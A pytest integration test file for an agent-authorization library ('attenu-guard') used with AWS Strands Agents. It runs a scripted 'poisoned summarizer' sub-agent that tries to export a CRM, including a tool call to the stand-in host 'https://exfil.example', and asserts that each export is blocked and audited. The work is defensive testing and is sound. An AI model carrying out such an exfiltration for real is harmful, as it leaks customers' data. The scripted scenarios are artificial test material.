"""
Integration test: attenu-guard x AWS Strands Agents (strands-agents 1.52.0).

Runs entirely offline: the LLM is `ScriptedModel`, a `strands.models.Model`
subclass that emits Bedrock-shaped `StreamEvent` dicts for a fixed script of
tool calls, so no AWS credentials and no API key are needed.

What is asserted is the *user-felt* outcome, not the internals: a sub-agent that
was delegated narrow authority tries to exfiltrate the CRM, and the tool body is
proven never to have run (via the side-effect ledger the tool body would have
written to). Both of Strands' delegation primitives are covered:

  * "agents as tools"  (`Agent.as_tool()` -> `_AgentAsTool`)
  * `strands.multiagent.Swarm` (`handoff_to_agent`)

The test drives the SHIPPED example (`examples/integrations/strands/demo.py` +
`attenu_guard.adapters.strands`), so a green run also proves the example works.
"""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

pytest.importorskip("strands")

from strands import Agent  # noqa: E402

from attenu_guard.reasons import BodyState, Capture  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    ReasonCode,
    RowLimit,
)

# --------------------------------------------------------------------------
# Load the example modules by path.
#
# NOTE: we deliberately do NOT put `examples/integrations/` on sys.path — the
# example directory is itself named `strands`, and adding its parent would
# shadow the real framework package. Loading by file location with an explicit
# module name avoids that entirely.
# --------------------------------------------------------------------------
_EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "integrations" / "strands"


def _load(module_name: str, filename: str):
    spec = importlib.util.spec_from_file_location(module_name, _EXAMPLE_DIR / filename)
    assert spec and spec.loader, f"cannot load {filename} from {_EXAMPLE_DIR}"
    mod = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = mod  # so `demo` can `import dg_strands`
    spec.loader.exec_module(mod)
    return mod


import attenu_guard.adapters.strands as dg_strands
demo = _load("dg_strands_demo", "demo.py")


# --------------------------------------------------------------------------
# Fixtures
# --------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _clean_world():
    """Every test starts with an empty side-effect ledger."""
    demo.reset_world()
    yield
    demo.reset_world()


# ==========================================================================
# 1. Agents-as-tools: the canonical poisoned summarizer
# ==========================================================================

def test_agents_as_tools_allows_the_legitimate_read():
    run = demo.run_agents_as_tools()
    assert ("crm_query", 4200) in run.executed, (
        "the in-authority CRM read must actually execute; "
        f"ledger was {run.executed}"
    )


def test_agents_as_tools_blocks_the_poisoned_export_before_the_body_runs():
    run = demo.run_agents_as_tools()
    # The user-felt symptom: nothing was ever exported anywhere.
    assert not any(name == "crm_export" for name, _ in run.executed), (
        "crm_export's BODY RAN — the exfiltration was not prevented; "
        f"ledger was {run.executed}"
    )
    assert demo.WORLD["exported_to"] == [], (
        "data left the building: crm_export wrote to "
        f"{demo.WORLD['exported_to']}"
    )


def test_agents_as_tools_denial_is_reported_back_to_the_model():
    run = demo.run_agents_as_tools()
    denials = [t for t in run.tool_results if t["status"] == "error"]
    assert denials, "the model was never told the export was refused"
    text = " ".join(c.get("text", "") for d in denials for c in d["content"])
    assert "denied" in text.lower()
    assert ReasonCode.SCOPE_NOT_GRANTED in text, (
        f"denial carried no machine-readable reason code: {text!r}"
    )


def test_the_same_block_through_strands_own_intervention_seam():
    """`Agent(interventions=[dg.as_intervention()])` must give the identical
    guarantee: Strands applies `Deny` as the same `cancel_tool`."""
    run = demo.run_agents_as_tools_via_intervention()
    assert ("crm_query", 4200) in run.executed
    assert not any(name == "crm_export" for name, _ in run.executed), run.executed
    assert demo.WORLD["exported_to"] == []
    text = " ".join(
        c.get("text", "")
        for t in run.tool_results if t["status"] == "error"
        for c in t["content"]
    )
    assert "DENIED" in text, text                        # applied by Strands, not by us
    assert ReasonCode.SCOPE_NOT_GRANTED in text, text    # our reason survived


# ==========================================================================
# 2. Swarm handoff: the same story through strands.multiagent.Swarm
# ==========================================================================

def test_swarm_handoff_allows_the_legitimate_read():
    run = demo.run_swarm()
    assert ("crm_query", 4200) in run.executed, run.executed


def test_swarm_handoff_blocks_the_poisoned_export_before_the_body_runs():
    run = demo.run_swarm()
    assert not any(name == "crm_export" for name, _ in run.executed), (
        f"crm_export's BODY RAN inside the swarm; ledger was {run.executed}"
    )
    assert demo.WORLD["exported_to"] == []


def test_swarm_handoff_mints_a_strictly_narrower_child_guard():
    run = demo.run_swarm()
    parent = run.guard_of("orchestrator")
    child = run.guard_of("summarizer")
    assert child is not None, "no Guard was minted for the handoff target"
    assert child.authority.is_narrower_than(parent.authority)
    assert not parent.authority.is_narrower_than(child.authority), (
        "attenuation was a no-op: parent and child hold the same authority"
    )


def test_swarm_handoff_to_undeclared_agent_is_cancelled_before_the_node_runs():
    """The other half of hook point 1: when no Authority is defined for the
    handoff target, no child Guard can be minted, so the node is cancelled by
    `BeforeNodeCallEvent.cancel_node` and its tools never execute."""
    run = demo.run_swarm_handoff_to_undeclared_agent()
    assert run.guard_of("ghostwriter") is None, (
        "a Guard was minted for an agent with no declared Authority"
    )
    assert demo.WORLD["exported_to"] == [], (
        f"the undeclared node ran and exported to {demo.WORLD['exported_to']}"
    )
    assert run.executed == [], f"the undeclared node ran tools: {run.executed}"
    assert run.status == "Status.FAILED", run.status


def test_swarm_sub_agent_cannot_re_delegate():
    """The summarizer was never granted `agent.handoff`, so its attempt to
    hand the task on to a third agent is refused — a restriction Strands'
    own swarm cannot express (every node gets handoff_to_agent)."""
    run = demo.run_swarm_with_rogue_handoff()
    assert run.handoff_targets == ["summarizer"], (
        "the summarizer managed to hand off despite holding no agent.handoff "
        f"scope; handoffs were {run.handoff_targets}"
    )


# ==========================================================================
# 3. Ceilings — a scope-legal call that exceeds a numeric bound
# ==========================================================================

def test_oversized_read_is_denied_by_the_row_ceiling():
    """`crm.read` IS granted, so this is not a scope failure — it is the
    RowLimit(5_000) the parent imposed on the child."""
    run = demo.run_agents_as_tools(query_rows=40_000)
    assert not any(name == "crm_query" for name, _ in run.executed), (
        f"a 40k-row read ran despite RowLimit(5_000); ledger was {run.executed}"
    )
    text = " ".join(
        c.get("text", "")
        for t in run.tool_results if t["status"] == "error"
        for c in t["content"]
    )
    assert ReasonCode.CEILING_EXCEEDED in text, text


# ==========================================================================
# 4. Structural guarantee — a child can never be minted wider than its parent
# ==========================================================================

def test_child_cannot_be_minted_wider_than_parent():
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")

    greedy = Authority(
        scopes={"crm.*", "mail.send", "admin.root"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )
    child = root.delegate("summarizer", greedy, task="exfiltrate everything")

    assert child.authority.is_narrower_than(root.authority)
    assert "admin.root" not in child.authority.scopes
    assert child.authority.ceiling("max_rows").max_rows == 100_000  # parent's bound held
    assert child.authority.ceiling("egress").level == "any"          # parent already allowed
    assert child.authority.ttl == 3600                               # parent's ttl held


def test_delegation_never_widens_a_ceiling_the_parent_tightened():
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")
    mid = root.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")
    grandchild = mid.delegate(
        "helper",
        Authority(scopes={"crm.read"}, ceilings=[RowLimit(10_000), EgressRank("any")], ttl=10_000),
        task="help",
    )
    assert grandchild.authority.ceiling("max_rows").max_rows == 5_000
    assert grandchild.authority.ceiling("egress").level == "none"
    assert grandchild.authority.ttl == 900
    assert grandchild.authority.is_narrower_than(mid.authority)
    assert grandchild.authority.is_narrower_than(root.authority)


# ==========================================================================
# 5. Cascade revocation
# ==========================================================================

def test_revocation_stops_every_later_tool_call():
    run = demo.run_agents_as_tools_with_revocation()
    assert ("crm_query", 4200) in run.executed, (
        "the pre-revocation read should have run"
    )
    assert ("crm_query", 100) not in run.executed, (
        "a read AFTER revocation still executed; "
        f"ledger was {run.executed}"
    )
    text = " ".join(
        c.get("text", "")
        for t in run.tool_results if t["status"] == "error"
        for c in t["content"]
    )
    assert ReasonCode.REVOKED in text, text


# ==========================================================================
# 6. Audit trail
# ==========================================================================

def test_audit_log_verifies_and_records_the_denial():
    run = demo.run_agents_as_tools()
    entries = run.audit
    ok, err = AuditLog.verify(entries)
    assert ok, f"audit chain failed verification: {err}"

    denies = [e for e in entries if e["event"] == "deny"]
    assert denies, "the refusal left no audit record"
    assert any(
        e.get("tool") == "crm_export" and e.get("reason") == ReasonCode.SCOPE_NOT_GRANTED
        for e in denies
    ), denies

    spawns = [e for e in entries if e["event"] == "spawn"]
    assert spawns, "the delegation itself left no audit record"
    assert spawns[0]["agent"] == "summarizer"


def test_audit_log_is_tamper_evident():
    run = demo.run_agents_as_tools()
    entries = [dict(e) for e in run.audit]
    victim = next(e for e in entries if e["event"] == "deny")
    victim["reason"] = "allow_me_please"
    ok, err = AuditLog.verify(entries)
    assert not ok and err, "a tampered audit log verified clean"


# ==========================================================================
# 7. The adapter's own contract (hook wiring), exercised directly
# ==========================================================================

def test_unmapped_tool_fails_closed_and_is_audited():
    """A tool nobody wrote a scope for must be denied, not silently allowed —
    and the denial must be a real, logged attenu-guard decision."""
    resolve = dg_strands.scope_map({"crm_query": "crm.read"}, unmapped="deny")
    req = resolve({"name": "some_new_tool", "toolUseId": "x", "input": {}})
    assert req is not None
    assert req.scope == "tool.some_new_tool"

    guard = Guard.issue("a", demo.ORCHESTRATOR_AUTHORITY)
    decision = guard.check(req.scope, context=req.context, tool="some_new_tool")
    assert not decision
    assert decision.reasons[0].code == ReasonCode.SCOPE_NOT_GRANTED
    assert any(e["event"] == "deny" for e in guard.audit_log().entries)


def test_unmapped_tool_can_be_opted_out_of_enforcement():
    resolve = dg_strands.scope_map({"crm_query": "crm.read"}, unmapped="allow")
    assert resolve({"name": "some_new_tool", "toolUseId": "x", "input": {}}) is None


def test_scope_map_builds_context_from_tool_arguments():
    resolve = dg_strands.scope_map(
        {"crm_query": lambda i: dg_strands.ScopeRequest("crm.read", {"rows": i["rows"]})}
    )
    req = resolve({"name": "crm_query", "toolUseId": "x", "input": {"rows": 4200}})
    assert req.scope == "crm.read"
    assert req.context == {"rows": 4200}


# ==========================================================================
# 8. The shipped demo runs end to end
# ==========================================================================

def test_demo_main_runs_clean(capsys):
    demo.main()
    out = capsys.readouterr().out
    assert "ALLOW" in out
    assert "DENY" in out
    assert "audit chain verified" in out


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# This adapter never calls the tool body itself -- Strands does -- so
# FRAMEWORK_POST_HOOK is opt-in (strict_single_hook=True); the default is
# the Guard's own honest PRE_HOOK_ONLY, and no outcome is ever recorded.
# ==========================================================================
def _v2_single_agent(script, *, strict_single_hook=True, authority=None):
    root = Guard.issue("orchestrator", authority or demo.ORCHESTRATOR_AUTHORITY,
                       task="root", schema_version=2)
    agent = Agent(
        name="orchestrator",
        model=demo.ScriptedModel(script),
        tools=[demo.crm_query, demo.crm_export],
        callback_handler=None,
    )
    dg = dg_strands.DelegationGuard(
        root_guard=root, root_agent=agent, scope_for=demo.SCOPE_FOR,
        authority_for=demo.authority_for, strict_single_hook=strict_single_hook,
    )
    agent.hooks.add_hook(dg)
    return root, agent, dg


def test_v2_allowed_call_records_a_returned_outcome():
    root, agent, dg = _v2_single_agent([
        ("tool", "crm_query", {"rows": 10}),
        ("text", "done"),
    ])
    agent("go")

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.FRAMEWORK_POST_HOOK
    assert allow["adapter"]["module"] == "attenu_guard.adapters.strands"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
    assert root.complete()


def test_v2_a_tool_that_raises_records_a_raised_outcome():
    from strands import tool as strands_tool

    @strands_tool
    def crm_query(rows: int) -> str:
        """Raises instead of returning.

        Args:
            rows: n.
        """
        raise ValueError("boom")

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    agent = Agent(
        name="orchestrator",
        model=demo.ScriptedModel([("tool", "crm_query", {"rows": 10}), ("text", "x")]),
        tools=[crm_query],
        callback_handler=None,
    )
    dg = dg_strands.DelegationGuard(
        root_guard=root, root_agent=agent, scope_for=demo.SCOPE_FOR,
        authority_for=demo.authority_for, strict_single_hook=True,
    )
    agent.hooks.add_hook(dg)
    agent("go")

    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RAISED
    assert outcome["error_code"] == "ValueError"


def test_v2_denied_call_never_records_an_outcome():
    root, agent, dg = _v2_single_agent(
        [("tool", "crm_export", {"destination": "https://exfil.example"}), ("text", "x")],
        authority=demo.SUMMARIZER_AUTHORITY,  # no crm.export
    )
    agent("go")

    assert demo.WORLD["exported_to"] == []
    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"] == []
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v1_chain_gets_no_capture_adapter_or_outcome():
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")  # v1, default
    agent = Agent(
        name="orchestrator",
        model=demo.ScriptedModel([("tool", "crm_query", {"rows": 10}), ("text", "done")]),
        tools=[demo.crm_query],
        callback_handler=None,
    )
    dg = dg_strands.DelegationGuard(
        root_guard=root, root_agent=agent, scope_for=demo.SCOPE_FOR,
        authority_for=demo.authority_for, strict_single_hook=True,  # attested, but v1 stays unchanged
    )
    agent.hooks.add_hook(dg)
    agent("go")

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome():
    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
    Capture.PRE_HOOK_ONLY, and after_tool_call never calls record_outcome() -- not merely
    "no outcome happens to be missing", but zero outcome events at all, and the body still
    genuinely runs (this is authorization-only, not a broken integration)."""
    root, agent, dg = _v2_single_agent(
        [("tool", "crm_query", {"rows": 10}), ("text", "done")],
        strict_single_hook=False,
    )
    agent("go")

    assert ("crm_query", 10) in demo.WORLD["executed"]
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
    assert "call_id" in allow  # still a genuine v2 chain -- just no outcome recorded against it
    assert [e for e in entries if e["event"] == "outcome"] == []
    assert root.complete()


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
    class AliasingList(list):
        def __deepcopy__(self, memo):
            return self

    live = {"input": {"x": AliasingList([1])}}
    snapshot = dg_strands._snapshot_params(live)

    assert snapshot["x"] is not live["input"]["x"], "the snapshot aliased the live mutable container"
    live["input"]["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


def test_v2_third_party_cancellation_after_our_allow_records_abandoned():
    """HONESTY NOTE (strict mode): this adapter's own denial never stashes a pending entry, so
    a cancel_message seen here can only be a THIRD-PARTY before-hook that vetoed the call AFTER
    this adapter already authorized it -- ABANDONED, not a fabricated RETURNED, and error_code
    is NOT attached (Guard.record_outcome only permits it together with RAISED)."""
    from strands.hooks import BeforeToolCallEvent, HookProvider, HookRegistry

    class ThirdPartyVeto(HookProvider):
        def register_hooks(self, registry: HookRegistry, **kwargs) -> None:
            registry.add_callback(BeforeToolCallEvent, self._veto)

        @staticmethod
        def _veto(event: BeforeToolCallEvent) -> None:
            if event.tool_use["name"] == "crm_query" and not event.cancel_tool:
                event.cancel_tool = "vetoed by a third party, after attenu-guard already allowed it"

    root, agent, dg = _v2_single_agent([("tool", "crm_query", {"rows": 10}), ("text", "done")])
    # Registered AFTER dg, so it runs after dg's own before_tool_call already authorized --
    # HookRegistry.invoke_callbacks runs every callback in registration order for
    # BeforeToolCallEvent (should_reverse_callbacks is False there), so this fires second.
    agent.hooks.add_hook(ThirdPartyVeto())
    agent("go")

    assert ("crm_query", 10) not in demo.WORLD["executed"]
    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.ABANDONED
    assert "error_code" not in outcome
